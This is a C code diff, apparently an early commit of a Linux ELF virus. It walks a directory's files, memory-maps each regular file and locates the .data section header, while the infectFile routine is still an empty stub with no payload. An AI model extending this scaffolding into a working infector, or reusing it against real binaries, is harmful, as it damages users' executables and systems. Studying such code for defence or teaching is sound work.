@@ -9,6 +9,8 @@
 #include <elf.h>
 
 #define BUF_SIZE 1024
+#define	__S_ISTYPE(mode, mask)	(((mode) & __S_IFMT) == (mask))
+#define	S_ISREG(mode)	 __S_ISTYPE((mode), __S_IFREG)
 
 typedef off_t off64_t;
 typedef ino_t ino64_t;
@@ -175,16 +177,18 @@ static void  *memmove(void *dest, const void *src, size_t n) {
 /* } */
 
 #include <sys/mman.h>
-#include <errno.h>
-#include <string.h>
 
-static int  infectFile(const char *dirname, const char *filename) {
+struct bin {
+  Elf64_Ehdr  *header;
+  off_t       size;
+};
+
+static int  mapFile(const char *dirname, const char *filename, struct bin *bin) {
   int         fd;
   size_t      len;
   char        *tmp;
   char        slash[] = "/";
   struct stat stats;
-  Elf64_Ehdr  *target;
 
   len = strlen(dirname) + strlen(filename) + 2;
   if ((tmp = mmap(0, len, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0)) <= 0)
@@ -201,21 +205,47 @@ static int  infectFile(const char *dirname, const char *filename) {
     munmap(tmp, len);
     return (-1);
   }
-  if ((target = mmap(0, stats.st_size, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_PRIVATE, fd, 0)) == MAP_FAILED) {
+  if (!S_ISREG(stats.st_mode)) {
+    close(fd);
+    munmap(tmp, len);
+    return (1);
+  }
+  if ((bin->header = mmap(0, stats.st_size, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_PRIVATE, fd, 0)) == MAP_FAILED) {
     close(fd);
     munmap(tmp, len);
     return (-1);
   }
   close(fd);
   munmap(tmp, len);
-  munmap(target, stats.st_size);
-  dprintf(1, "Success\n");
+  bin->size = stats.st_size;
+  return (0);
+}
+
+Elf64_Shdr *getDataSectionHeader(Elf64_Ehdr *header) {
+  Elf64_Shdr  *pointer;
+  Elf64_Shdr  *shstrHeader;
+  char        dataName[] = ".data";
+
+  pointer = ((void *)header) + header->e_shoff;
+  shstrHeader = ((void *)header) + header->e_shoff + sizeof(Elf64_Shdr) * header->e_shstrndx;
+  while (strcmp(((void *)header) + shstrHeader->sh_offset + pointer->sh_name, dataName) != 0)
+    pointer += 1;
+  return (pointer);
+}
+
+static int  infectFile(struct bin bin) {
+  Elf64_Shdr *data;
+
+  data = getDataSectionHeader(bin.header);
+  return (0);
 }
 
 static int  infectBins(const char *dirname) {
+  int                   fd;
+  int                   ret;
+  struct bin            bin;
   int                   bpos;
   int                   nread;
-  int                   fd;
   struct linux_dirent   *dirp;
   char                  buf[BUF_SIZE];
   char                  d_type;
@@ -227,8 +257,12 @@ static int  infectBins(const char *dirname) {
   bpos = 0;
   while (bpos < nread) {
     dirp = (struct linux_dirent *) (buf + bpos);
-    if (infectFile(dirname, dirp->d_name) == -1)
+    if ((ret = mapFile(dirname, dirp->d_name, &bin)) == -1)
       return (-1);
+    if (ret == 0) {
+      if (infectFile(bin) == -1)
+        return (-1);
+    }
     bpos += dirp->d_reclen;
   }
   close(fd);
